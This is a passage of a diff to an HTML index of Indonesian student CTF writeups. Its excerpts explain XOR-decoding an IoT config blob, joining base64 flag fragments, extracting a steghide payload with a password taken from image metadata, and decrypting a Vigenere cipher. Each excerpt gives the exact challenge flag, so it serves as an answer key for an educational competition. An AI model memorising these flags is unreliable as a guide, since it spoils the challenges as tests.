adalah: 0x00-0x03 : 4-byte XOR key 0x04-EOF : XOR-encoded stringsDari struktur tersebut, saya mengambil 4 byte pertama sebagai key, yaitu:4B 33 61 5FKemudian, saya membuat script Python sederhana untuk membaca file config.bin, mengambil key dari 4 byte pertama, lalu mendecode seluruh data setelah offset 0x04 dengan operasi XOR.Script yang digunakan:from pathlib import Pathdata Path config.bin .read bytes key data :4 enc data 4: dec bytes b key i 4 for i, b in enumerate enc for s in dec.split b x00 : if s: print s.decode Script tersebut bekerja dengan cara: Membaca seluruh isi config.bin. Mengambil 4 byte pertama sebagai XOR key. Mengambil data setelah 4 byte pertama sebagai data terenkripsi. Melakukan XOR setiap byte data dengan key secara berulang. Memisahkan hasil decode berdasarkan null byte 0x00, karena setiap string diakhiri dengan null terminator.Setelah script dijalankan, muncul beberapa string konfigurasi seperti alamat server, endpoint internal, dan satu string flag.Hasil decode yang ditemukan:192.168.47.23:8080http: update.telematika-nusantara.internal api v1 beaconvpn-gw.telematika-nusantara.internalL2FwaS92Mi9iZWFjb24vdXBkYXRlc2-backup.telematika.net:443flag xor k3y K33l 3xtr4ct3d Dari hasil tersebut, string terakhir merupakan flag challenge.Flagflag xor k3y K33l 3xtr4ct3d Kesimpulan Hal yang DipelajariPada challenge ini saya mempelajari bahwa file binary tidak selalu dapat dianalisis hanya dengan melihat string yang tampak secara langsung. Informasi penting bisa disimpan dalam bentuk encoded atau encrypted. Dengan membaca catatan analis dan memahami potongan source code, dapat diketahui bahwa file config.bin menggunakan XOR encryption sederhana dengan key yang disimpan pada 4 byte pertama file. Setelah key ditemukan dan proses XOR dilakukan secara benar, isi konfigurasi berhasil didecode dan flag dapat ditemukan.">
-        Pada challenge ini diberikan sebuah file binary blob konfigurasi dari perangkat IoT yang diduga telah dikompromikan. Bersama file tersebut, terdapat catatan analis dan potongan source code yang menjelaskan cara data konfigurasi diproses. Tujuan dari challenge ini adalah memahami struktur file...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/jejak-digital-seorang-dev.html" class="post-excerpt-image" aria-label="W1-F1 Jejak Digital Seorang Dev">
-      <img src="/images/oxucl-logo.jpg" alt="W1-F1 Jejak Digital Seorang Dev" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/jejak-digital-seorang-dev.html">W1-F1 Jejak Digital Seorang Dev</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
-        osint
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
-        recon
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-F1 Warmup Selamat Datang Kategori Recon OSINT Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Easy File Sumber Website dari lomba Deskripsi SingkatPada challange ini diberikan website Portfolio Budi Santoso, dan menurut instruksi ada informasi sensitif yang tersebar. Catatan dari tantangan ini memberitahukan bahwa flag bukan hanya ada di tampilan atau halaman utama.Analisis AwalSaya melakukan analisis pada bagian front end website. Kemudian di halaman whois dump.txt saya menemukan potongan flag part 2 yang di-encoding dengan base64. RfYjRzMzY0X2NoNDFufQ Pemeriksaan secara backend dilakukan. Dari kode halaman utama ditemukan komentar tentang adanya halaman yang disembunyikan. lt; -- halaman pribadi: catatan.html -- gt;Di halaman catatan.html ditemukan bagian 1 dari flag:ZmxhZ3t0dzBfZnI0Z20zbnLangkah Penyelesaian Buka terminal linux Gabungkan part 1 dan 2 dari flag:ZmxhZ3t0dzBfZnI0Z20zbnRfYjRzMzY0X2NoNDFufQ Decode dengan tool base64:Flagflag tw0 fr4gm3nt b4s364 ch41n Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa informasi penting pada website tidak selalu terlihat di halaman utama. Dengan memeriksa source code, halaman tersembunyi, dan file tambahan seperti whois dump.txt, saya dapat menemukan dua bagian flag. Kedua bagian tersebut kemudian digabungkan dan didecode menggunakan base64 untuk mendapatkan flag akhir.">
-        Pada challange ini diberikan website Portfolio Budi Santoso, dan menurut instruksi ada informasi sensitif yang tersebar. Catatan dari tantangan ini memberitahukan bahwa flag bukan hanya ada di tampilan atau halaman utama. Analisis Awal Saya melakukan analisis pada bagian front end...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/foto-mencurigakan.html" class="post-excerpt-image" aria-label="W1-E1 Foto Mencurigakan">
-      <img src="/images/oxucl-logo.jpg" alt="W1-E1 Foto Mencurigakan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/foto-mencurigakan.html">W1-E1 Foto Mencurigakan</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20forensics%22" class="tag" data-tooltip='Show items with the tag "forensics"'>
-        forensics
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-E1: Foto Mencurigakan Kategori Digital Forensics Event ZERO DAY Mini Games 2026 Poin 100 Tingkat Beginner File foto kantor.jpg dan readme analis.txt Deskripsi SingkatChallenge W1-E1: Foto Mencurigakan merupakan challenge kategori Digital Forensics. Pada soal diberikan sebuah file gambar bernama foto kantor.jpg dan file catatan analis readme analis.txt. Dari catatan analis, diketahui bahwa foto tersebut kemungkinan mengandung file tersembunyi dan perlu diperiksa menggunakan tool forensik standar.Analisis AwalLangkah awal yang saya lakukan adalah membaca file readme analis.txt. Di dalam catatan tersebut terdapat petunjuk bahwa gambar yang diberikan tidak hanya berisi tampilan visual biasa, tetapi kemungkinan menyimpan file lain di dalamnya. Karena challenge ini termasuk digital forensics dan berkaitan dengan gambar, saya mulai memeriksa metadata serta kemungkinan adanya teknik steganografi pada file foto kantor.jpg.Langkah PenyelesaianPertama, saya memeriksa metadata gambar menggunakan exiftool.exiftool foto kantor.jpgDari hasil pengecekan metadata, ditemukan komentar yang berisi password:pass: kantor2026Password ini menjadi petunjuk bahwa file gambar kemungkinan menggunakan teknik steganografi dengan password tertentu. Selanjutnya, saya mencoba mengekstrak file tersembunyi menggunakan steghide.steghide extract -sf foto kantor.jpg -p kantor2026Setelah perintah tersebut dijalankan, berhasil diekstrak sebuah file bernama hidden.txt.cat hidden.txtIsi file tersebut menampilkan flag challenge.Flagflag st3gh1d3 k4nt0r 2026 f0und Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa file gambar tidak selalu hanya berisi data visual yang terlihat oleh mata. Informasi penting dapat disembunyikan di dalam metadata maupun menggunakan teknik steganografi. Pada kasus ini, metadata gambar menyimpan password yang kemudian digunakan untuk mengekstrak file tersembunyi menggunakan steghide.">
-        Challenge W1-E1: Foto Mencurigakan merupakan challenge kategori Digital Forensics. Pada soal diberikan sebuah file gambar bernama foto_kantor.jpg dan file catatan analis readme_analis.txt. Dari catatan analis, diketahui bahwa foto tersebut kemungkinan mengandung file tersembunyi dan perlu diperiksa menggunakan tool forensik standar....
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
     <a href="/2026/06/10/aktivasi-sistem.html" class="post-excerpt-image" aria-label="W1-D1 Aktivasi Sistem">
       <img src="/images/oxucl-logo.jpg" alt="W1-D1 Aktivasi Sistem" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
     </a>
@@ -1847,7 +580,7 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
   <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
     
 
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
 
     
       <span class="portrait-name">
@@ -1879,6 +612,11 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
     </span>
   
 
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
   
 </div>
 
@@ -1924,6 +662,1338 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
     
 
     
+    <a href="/2026/06/10/foto-mencurigakan.html" class="post-excerpt-image" aria-label="W1-E1 Foto Mencurigakan">
+      <img src="/images/oxucl-logo.jpg" alt="W1-E1 Foto Mencurigakan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/foto-mencurigakan.html">W1-E1 Foto Mencurigakan</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20forensics%22" class="tag" data-tooltip='Show items with the tag "forensics"'>
+        forensics
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-E1: Foto Mencurigakan Kategori Digital Forensics Event ZERO DAY Mini Games 2026 Poin 100 Tingkat Beginner File foto kantor.jpg dan readme analis.txt Deskripsi SingkatChallenge W1-E1: Foto Mencurigakan merupakan challenge kategori Digital Forensics. Pada soal diberikan sebuah file gambar bernama foto kantor.jpg dan file catatan analis readme analis.txt. Dari catatan analis, diketahui bahwa foto tersebut kemungkinan mengandung file tersembunyi dan perlu diperiksa menggunakan tool forensik standar.Analisis AwalLangkah awal yang saya lakukan adalah membaca file readme analis.txt. Di dalam catatan tersebut terdapat petunjuk bahwa gambar yang diberikan tidak hanya berisi tampilan visual biasa, tetapi kemungkinan menyimpan file lain di dalamnya. Karena challenge ini termasuk digital forensics dan berkaitan dengan gambar, saya mulai memeriksa metadata serta kemungkinan adanya teknik steganografi pada file foto kantor.jpg.Langkah PenyelesaianPertama, saya memeriksa metadata gambar menggunakan exiftool.exiftool foto kantor.jpgDari hasil pengecekan metadata, ditemukan komentar yang berisi password:pass: kantor2026Password ini menjadi petunjuk bahwa file gambar kemungkinan menggunakan teknik steganografi dengan password tertentu. Selanjutnya, saya mencoba mengekstrak file tersembunyi menggunakan steghide.steghide extract -sf foto kantor.jpg -p kantor2026Setelah perintah tersebut dijalankan, berhasil diekstrak sebuah file bernama hidden.txt.cat hidden.txtIsi file tersebut menampilkan flag challenge.Flagflag st3gh1d3 k4nt0r 2026 f0und Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa file gambar tidak selalu hanya berisi data visual yang terlihat oleh mata. Informasi penting dapat disembunyikan di dalam metadata maupun menggunakan teknik steganografi. Pada kasus ini, metadata gambar menyimpan password yang kemudian digunakan untuk mengekstrak file tersembunyi menggunakan steghide.">
+        Challenge W1-E1: Foto Mencurigakan merupakan challenge kategori Digital Forensics. Pada soal diberikan sebuah file gambar bernama foto_kantor.jpg dan file catatan analis readme_analis.txt. Dari catatan analis, diketahui bahwa foto tersebut kemungkinan mengandung file tersembunyi dan perlu diperiksa menggunakan tool forensik standar....
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/jejak-digital-seorang-dev.html" class="post-excerpt-image" aria-label="W1-F1 Jejak Digital Seorang Dev">
+      <img src="/images/oxucl-logo.jpg" alt="W1-F1 Jejak Digital Seorang Dev" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/jejak-digital-seorang-dev.html">W1-F1 Jejak Digital Seorang Dev</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
+        osint
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
+        recon
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-F1 Warmup Selamat Datang Kategori Recon OSINT Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Easy File Sumber Website dari lomba Deskripsi SingkatPada challange ini diberikan website Portfolio Budi Santoso, dan menurut instruksi ada informasi sensitif yang tersebar. Catatan dari tantangan ini memberitahukan bahwa flag bukan hanya ada di tampilan atau halaman utama.Analisis AwalSaya melakukan analisis pada bagian front end website. Kemudian di halaman whois dump.txt saya menemukan potongan flag part 2 yang di-encoding dengan base64. RfYjRzMzY0X2NoNDFufQ Pemeriksaan secara backend dilakukan. Dari kode halaman utama ditemukan komentar tentang adanya halaman yang disembunyikan. lt; -- halaman pribadi: catatan.html -- gt;Di halaman catatan.html ditemukan bagian 1 dari flag:ZmxhZ3t0dzBfZnI0Z20zbnLangkah Penyelesaian Buka terminal linux Gabungkan part 1 dan 2 dari flag:ZmxhZ3t0dzBfZnI0Z20zbnRfYjRzMzY0X2NoNDFufQ Decode dengan tool base64:Flagflag tw0 fr4gm3nt b4s364 ch41n Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa informasi penting pada website tidak selalu terlihat di halaman utama. Dengan memeriksa source code, halaman tersembunyi, dan file tambahan seperti whois dump.txt, saya dapat menemukan dua bagian flag. Kedua bagian tersebut kemudian digabungkan dan didecode menggunakan base64 untuk mendapatkan flag akhir.">
+        Pada challange ini diberikan website Portfolio Budi Santoso, dan menurut instruksi ada informasi sensitif yang tersebar. Catatan dari tantangan ini memberitahukan bahwa flag bukan hanya ada di tampilan atau halaman utama. Analisis Awal Saya melakukan analisis pada bagian front end...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/konfigurasi-terenkripsi.html" class="post-excerpt-image" aria-label="W1-A3 Konfigurasi Terenkripsi">
+      <img src="/images/oxucl-logo.jpg" alt="W1-A3 Konfigurasi Terenkripsi" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/konfigurasi-terenkripsi.html">W1-A3 Konfigurasi Terenkripsi</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
+        crypto
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
+        puzzle
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-A3 Konfigurasi Terenkripsi Kategori Crypto amp; Puzzle Event ZERO DAY Mini Games 2026 Poin 200 Difficulty Beginner File config.bin, key hint.txt, dan partial source.c Deskripsi SingkatPada challenge ini diberikan sebuah file binary blob konfigurasi dari perangkat IoT yang diduga telah dikompromikan. Bersama file tersebut, terdapat catatan analis dan potongan source code yang menjelaskan cara data konfigurasi diproses. Tujuan dari challenge ini adalah memahami struktur file binary, menemukan kunci enkripsi, lalu mendecode isi konfigurasi hingga mendapatkan flag.Analisis AwalLangkah pertama yang saya lakukan adalah membaca file key hint.txt. Dari catatan tersebut diketahui bahwa 4 byte pertama pada file config.bin merupakan XOR key. Nilai pada offset 0x00-0x03 adalah:4B 33 61 5FJika dikonversi dari hexadecimal ke ASCII, nilai tersebut menjadi:K3a Selanjutnya, saya membaca file partial source.c. Dari potongan source code tersebut terlihat bahwa program membaca 4 byte pertama sebagai key, lalu melewati 4 byte awal file sebelum melakukan proses decode. Data setelah offset 0x04 di-XOR menggunakan key 4-byte secara berulang atau siklik.Catatan pada soal berbunyi: Dalam analisis biner, yang tampak jelas seringkali adalah pengalih perhatian. Petunjuk ini menunjukkan bahwa tidak cukup hanya melihat string yang tampak langsung dari file binary. Isi sebenarnya perlu didecode terlebih dahulu menggunakan algoritma yang sesuai dengan source code yang diberikan.Langkah PenyelesaianPertama, saya membuka file petunjuk untuk mengetahui struktur config.bin. Struktur file tersebut adalah: 0x00-0x03 : 4-byte XOR key 0x04-EOF : XOR-encoded stringsDari struktur tersebut, saya mengambil 4 byte pertama sebagai key, yaitu:4B 33 61 5FKemudian, saya membuat script Python sederhana untuk membaca file config.bin, mengambil key dari 4 byte pertama, lalu mendecode seluruh data setelah offset 0x04 dengan operasi XOR.Script yang digunakan:from pathlib import Pathdata Path config.bin .read bytes key data :4 enc data 4: dec bytes b key i 4 for i, b in enumerate enc for s in dec.split b x00 : if s: print s.decode Script tersebut bekerja dengan cara: Membaca seluruh isi config.bin. Mengambil 4 byte pertama sebagai XOR key. Mengambil data setelah 4 byte pertama sebagai data terenkripsi. Melakukan XOR setiap byte data dengan key secara berulang. Memisahkan hasil decode berdasarkan null byte 0x00, karena setiap string diakhiri dengan null terminator.Setelah script dijalankan, muncul beberapa string konfigurasi seperti alamat server, endpoint internal, dan satu string flag.Hasil decode yang ditemukan:192.168.47.23:8080http: update.telematika-nusantara.internal api v1 beaconvpn-gw.telematika-nusantara.internalL2FwaS92Mi9iZWFjb24vdXBkYXRlc2-backup.telematika.net:443flag xor k3y K33l 3xtr4ct3d Dari hasil tersebut, string terakhir merupakan flag challenge.Flagflag xor k3y K33l 3xtr4ct3d Kesimpulan Hal yang DipelajariPada challenge ini saya mempelajari bahwa file binary tidak selalu dapat dianalisis hanya dengan melihat string yang tampak secara langsung. Informasi penting bisa disimpan dalam bentuk encoded atau encrypted. Dengan membaca catatan analis dan memahami potongan source code, dapat diketahui bahwa file config.bin menggunakan XOR encryption sederhana dengan key yang disimpan pada 4 byte pertama file. Setelah key ditemukan dan proses XOR dilakukan secara benar, isi konfigurasi berhasil didecode dan flag dapat ditemukan.">
+        Pada challenge ini diberikan sebuah file binary blob konfigurasi dari perangkat IoT yang diduga telah dikompromikan. Bersama file tersebut, terdapat catatan analis dan potongan source code yang menjelaskan cara data konfigurasi diproses. Tujuan dari challenge ini adalah memahami struktur file...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/korespondensi-tersegel.html" class="post-excerpt-image" aria-label="Korespondensi Tersegel">
+      <img src="/images/oxucl-logo.jpg" alt="Korespondensi Tersegel" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/korespondensi-tersegel.html">Korespondensi Tersegel</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
+        crypto
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
+        puzzle
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge Korespondensi Tersegel Kategori Crypto amp; Puzzle Event ZERO DAY Scholar Battle Poin 25 Difficulty Easy File readme.txt, company logo.jpg, cipher text.txt Deskripsi SingkatPada challenge ini, diberikan sebuah teks terenkripsi yang diduga merupakan korespondensi internal dari PT Arkana Sistem. Tugas utama dari challenge ini adalah menemukan metode enkripsi yang digunakan, mencari kunci dekripsi, lalu mendekripsi pesan untuk mendapatkan flag.Analisis AwalLangkah pertama yang saya lakukan adalah membaca file readme.txt. Dari file tersebut diketahui bahwa pesan dienkripsi menggunakan metode klasik, dan kunci dekripsi dapat ditemukan pada salah satu file lain di dalam archive. Readme juga memberikan petunjuk untuk memeriksa data yang tidak terlihat secara visual.Selanjutnya, saya membuka file cipher text.txt. Isi file tersebut berupa teks acak dengan huruf kapital, tetapi susunannya masih menyerupai format surat atau korespondensi. Di dalam teks tersebut juga terdapat bagian yang terlihat seperti flag, yaitu:SLAX F1G3A3R3 4RB4X4 D3PRYGD3D Bagian ini kemungkinan besar merupakan flag yang masih terenkripsi. Karena readme menyebutkan bahwa kunci ada pada file lain dan perlu memeriksa data yang tidak terlihat secara visual, saya kemudian mengecek metadata dari file company logo.jpg.Langkah Penyelesaian Membaca file readme.txt untuk mencari petunjuk awal. Dari readme, diketahui bahwa: Cipher yang digunakan adalah metode klasik Kunci berada di salah satu file lain Perlu memeriksa data tersembunyi atau metadata Mengecek metadata gambar company logo.jpg menggunakan perintah:exiftool company logo.jpg Dari metadata gambar ditemukan komentar:kunci: ARKANA Karena kunci berupa kata, metode klasik yang sesuai adalah Vigenere Cipher. Melakukan dekripsi isi cipher text.txt menggunakan Vigenere Cipher dengan key:ARKANA Setelah didekripsi, teks menjadi terbaca sebagai korespondensi internal. Bagian flag yang awalnya:SLAX F1G3A3R3 4RB4X4 D3PRYGD3D berubah menjadi:FLAG V1G3N3R3 4RK4N4 D3CRYPT3D Karena instruksi challenge meminta submit flag dalam format huruf kecil, maka flag diubah menjadi lowercase.Flagflag v1g3n3r3 4rk4n4 d3crypt3d Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa pada soal kriptografi, petunjuk tidak selalu berada langsung di file ciphertext. File pendukung seperti gambar juga bisa menyimpan informasi penting melalui metadata. Selain itu, ketika sebuah cipher klasik menggunakan kunci berupa kata, salah satu metode yang perlu dicoba adalah Vigenere Cipher. Pada challenge ini, key ARKANA berhasil digunakan untuk mendekripsi pesan dan mendapatkan flag.">
+        Pada challenge ini, diberikan sebuah teks terenkripsi yang diduga merupakan korespondensi internal dari PT Arkana Sistem. Tugas utama dari challenge ini adalah menemukan metode enkripsi yang digunakan, mencari kunci dekripsi, lalu mendekripsi pesan untuk mendapatkan flag. Analisis Awal Langkah pertama...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/lalu-lintas-jaringan.html" class="post-excerpt-image" aria-label="W1-E2 Lalu Lintas Jaringan">
+      <img src="/images/oxucl-logo.jpg" alt="W1-E2 Lalu Lintas Jaringan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/lalu-lintas-jaringan.html">W1-E2 Lalu Lintas Jaringan</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
